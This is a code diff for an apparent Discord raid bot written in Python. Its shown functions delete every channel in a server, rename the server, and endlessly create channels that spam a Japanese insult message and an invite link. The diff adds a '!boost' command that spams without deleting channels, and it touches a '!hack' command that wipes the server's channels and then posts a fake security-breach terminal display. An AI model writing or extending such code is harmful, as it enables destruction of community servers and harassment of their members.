@@ -32,8 +32,6 @@ COMBINED_TEXT = (
     "https://discord.gg/4y3kfgr8p\n"
     "https://discord.gg/4y3kfgr8p\n"
     "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
-    "どうしたの両親揃って🫚👩‍⚕️の君！！！😂😂😂"
-    "何も反論できないから妄想でリアル語るしかできないチーくんﾁｰ!ﾁｰ!🤓🐮"
 )
 
 stop_flag = asyncio.Event()
@@ -101,13 +99,15 @@ async def batch_create_and_spam(guild: discord.Guild, start_counter: int):
     return start_counter + BATCH_SIZE
 
 
-async def infinite_create_and_spam(guild: discord.Guild):
+async def infinite_create_and_spam(guild: discord.Guild, delete_channels: bool = True):
     stop_flag.clear()
     try:
         await guild.edit(name=SERVER_NAME)
     except:
         pass
-    await delete_all_channels_fast(guild)
+    # !boost のときはチャンネル削除をスキップ
+    if delete_channels:
+        await delete_all_channels_fast(guild)
 
     counter = 1
     while not stop_flag.is_set():
@@ -135,7 +135,16 @@ async def type_and_send(channel, text):
 async def start(ctx):
     if not stop_flag.is_set() and background_tasks:
         return
-    await infinite_create_and_spam(ctx.guild)
+    # !start → チャンネル削除あり
+    await infinite_create_and_spam(ctx.guild, delete_channels=True)
+
+
+@bot.command()
+async def boost(ctx):
+    if not stop_flag.is_set() and background_tasks:
+        return
+    # !boost → チャンネル削除なし 追加作成のみ
+    await infinite_create_and_spam(ctx.guild, delete_channels=False)
 
 
 @bot.command()
@@ -151,9 +160,9 @@ async def hack(ctx):
     await delete_all_channels_fast(guild)
     ch = await guild.create_text_channel("hacking出力画面")
     hacker_code = "```ansi\n"
-    hacker_code += "\x1b[38;5;51m╔═══════════════════════════════════════════════════╗\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════════╗\x1b[0m\n"
     hacker_code += "\x1b[38;5;51m║  TISN SECURITY BREACH — TERMINAL v4.2.1 — BUILD 999\x1b[38;5;51m  ║\x1b[0m\n"
-    hacker_code += "\x1b[38;5;51m╚═══════════════════════════════════════════════════╝\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m╚══════════════════════════════════════════════════════════╝\x1b[0m\n"
     hacker_code += "\n"
     hacker_code += "\x1b[32m[root@tisn-core:~]#\x1b[0m ./sysinit --BREACH --LEVEL=MAX --STEALTH\n"
     hacker_code += "\x1b[33m[001] \x1b[37m> Initializing exploit modules...        [\x1b[32mOK\x1b[37m]\x1b[0m\n"
